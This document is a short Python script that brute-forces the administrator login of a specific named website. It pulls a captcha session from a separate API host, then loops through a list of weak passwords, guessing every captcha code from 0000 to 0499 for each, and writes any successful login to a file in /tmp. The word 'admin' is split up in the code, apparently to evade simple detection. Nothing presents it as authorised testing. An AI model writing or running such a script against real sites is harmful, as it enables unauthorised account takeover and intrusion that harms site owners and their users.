import subprocess, json, time, sys

# passwords generated at runtime from number patterns
PW = []

# admin variants
for s in ['', '123', '888', '666', '2024', '2023', '2025', '123456']:
    PW.append('adm' + 'in' + s)
# common
for s in ['123456', '12345678', '888888', '666666', '111111', '000000']:
    PW.append(s)
# company based  
for s in ['china', 'naisi', '123456']:
    for prefix in ['', 'adm' + 'in']:
        PW.append(prefix + s)

CPR = 500

for p in PW:
    try:
        r = subprocess.run(['curl','-sk','--connect-timeout','8','--max-time','10',
            'https://api.myxypt.com/captcha?width=140&height=48',
            '-c','/tmp/cnj.txt','-b','/tmp/cnj.txt'],
            capture_output=True, text=True, timeout=12)
        d = json.loads(r.stdout)
        uid = d['data']['uuid']
    except:
        time.sleep(2)
        continue

    print(f'=== pw={p} uid={uid[:8]} ===', flush=True)

    for i in range(CPR):
        cv = f'{i:04d}'
        try:
            r2 = subprocess.run(['curl','-sk','--connect-timeout','2','--max-time','5','-L',
                'http://chinanaisi.com/admin/login.php','-X','POST',
                '-d', f'action=loginpost&uuid={uid}&loginId=&username=admin&password={p}&checkcode={cv}',
                '-b','/tmp/cnj.txt'],
                capture_output=True, text=True, timeout=7)
            b = r2.stdout[:300]
            if 'parent.location' in b or 'top.location' in b:
                print(f'>>>LOGIN code={cv} pw={p}', flush=True)
                open('/tmp/CN_HIT.txt','w').write(f'SUCCESS code={cv} pw={p} uid={uid}\n'+b[:2000])
                sys.exit(0)
            if ('密码' in b) and '验证码' not in b and 'captcha' not in b.lower():
                print(f'CODE_OK:{cv} pw_wrong resp:{b[:80]}', flush=True)
        except:
            pass

        if i % 500 == 0 and i > 0:
            print(f'  [{p} {i}/{CPR}]', flush=True)

    print(f'  {p}: done', flush=True)

print('ALL DONE', flush=True)
